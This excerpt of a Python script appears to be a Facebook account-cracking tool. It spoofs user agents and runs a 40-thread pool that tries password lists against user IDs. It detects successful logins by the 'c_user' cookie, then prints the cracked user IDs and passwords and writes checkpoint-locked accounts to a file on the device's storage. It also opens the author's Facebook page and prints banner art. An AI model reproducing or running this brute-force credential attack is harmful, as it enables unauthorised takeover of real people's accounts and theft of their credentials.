...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://www.facebook.com/nafiz.official.account.BICP/")
logo =(
 ...
 |_| \_/_/    \_\_|    |_____/_____|
    ...
    if Jaber in ["2","B"]:
        os.system('xdg-open https://www.facebook.com/nafiz.official.account.BICP')
    if Jaber in ["3","C"]:
        os.system('https://www.facebook.com/nafiz.official.account.BICP/')
    if Jaber in ["0","X"]:
        os.system('exit')
...
def Jabers():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m NAFIZ VAU ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m NAFIZ VAU')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Jaberm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mNAFIZ_VAU\033[1;91m]😪[\033[1;92m%s\033[1;91m]💥[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mNAFIZ VAU-BD\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[NAFIZ VAU-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/NAFIZ_VAU-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
